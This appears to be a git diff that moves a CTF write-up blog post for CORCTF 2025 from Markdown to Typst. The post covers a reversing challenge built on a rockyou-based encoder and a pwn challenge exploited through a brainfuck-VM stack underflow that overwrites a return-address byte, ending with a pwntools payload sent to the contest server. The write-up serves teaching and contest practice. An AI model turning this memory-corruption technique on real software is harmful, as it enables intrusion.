@@ -1,12 +1,16 @@
-+++
-title = 'CORCTF 2025'
-date = 2025-09-11T16:07:27-03:00
-draft = false
-tags = ["rev", "pwn", "ctf"]
-+++
+#import "./html_elements.typ": post
+
+#show: post
+
+// +++
+// title = 'CORCTF 2025'
+// date = 2025-09-11T16:07:27-03:00
+// draft = false
+// tags = ["rev", "pwn", "ctf"]
+// +++
 
 
-# yourock (rev) - 124 solves / 119 pts
+= yourock (rev) - 124 solves / 119 pts
 
 
 Below is the full code of the main function after some manual reversing. The challenge is basically an input encoder that encodes each character to a word based on a big dictionary (rockyou.txt password wordlist in this case).
@@ -79,7 +83,7 @@ __int64 __fastcall main(int a1, char **argv, char **a3)
     return 1;
   }
   return v5;
-}  
+}
 ```
 
 It takes the input, and maps each character to a line on the `rockyou.txt` file, below is the most important function in the challenge
@@ -124,7 +128,7 @@ Solution:
 # Encoded output:
 # flower richard
 # 58 124
-# =============== 
+# ===============
 # ~> ./encode "AAAA"
 # Encoded output:
 # carlos thomas 123456 12345 123456789
@@ -144,7 +148,7 @@ for (i, idx) in enumerate(enc[1:]):
     key = key ^ idx ^ i
 ```
 
-# frog (pwn) - 40 solves / 153 pts
+= frog (pwn) - 40 solves / 153 pts
 
 This challenge was quite a fun one.
 
@@ -170,7 +174,7 @@ int mmio_dump_flag()
     putchar(v1);
   }
   return fclose(stream);
-}  
+}
 ```
 
 This means that we can solve the chal by achieving a control flow redirection to it, maybe even just by subtracting something from a byte from a pointer stored on the stackt that points to somewhere on the same segment.
@@ -339,11 +343,11 @@ This is not immediately useful, since the return addresses that are from functio
 We need to use the underflow to grant more exploitation primitives. This is where a bit of reversing comes in, see the bounds check:
 
 ```c
-  
+
    0x555555555681 <interpret_program+417>:      mov    rax,QWORD PTR [rbp-0x120]
    0x555555555688 <interpret_program+424>:      cmp    QWORD PTR [rbp-0x118],rax
 => 0x55555555568f <interpret_program+431>:      jae    0x5555555556aa <interpret_program+458>
- ```
+```
 
 One of those stores the maximum address for the brainfuck vm's tape, and the other one is the current IP (or tape address if you want to call it that way, etc...). The good news there is that those variables are stored on the stack, as you can see my the instructions loading from specific offsets from the stack base, AND they can be ovewriten by our underflow.
 
@@ -369,7 +373,7 @@ So breaking this down:
 +[>[<-]<[->+<]>]
 ```
 
-- Then we move the IP to point to the cell right before the byte we want to modify 
+- Then we move the IP to point to the cell right before the byte we want to modify
 
 ```elixir
 >>>>>>>>>>>>>>>
@@ -380,7 +384,7 @@ At this point, this will be the tape:
 ```
                   we are here
                       |
-                      v  
+                      v
 10 d2 ff ff ff 7f 00 00 35 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
 ```
 
@@ -401,11 +405,11 @@ Our objective is to increase that single byte from `0x35` to `0x66`, to that the
 ```
                   we are here
                       |
-                      v  
+                      v
 10 d2 ff ff ff 7f 00 00 35 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
                          |
                          | just increase a little from 0x35 to 0x66
-                         | 
+                         |
                          v
 10 d2 ff ff ff 7f 00 00 66 54 55 55 55 55 00 00 00 00 00 00 00 00 00 00
 
@@ -438,5 +442,5 @@ p = '+<+<+<+>>>-+[>[<-]<[->+<]>]>>>>>>>>>>>>>>>+++++++[>+++++++<-]#'
 io = remote('ctfi.ng', 31415)
 io.sendline(p.encode())
 io.interactive()
-  
+
 ```
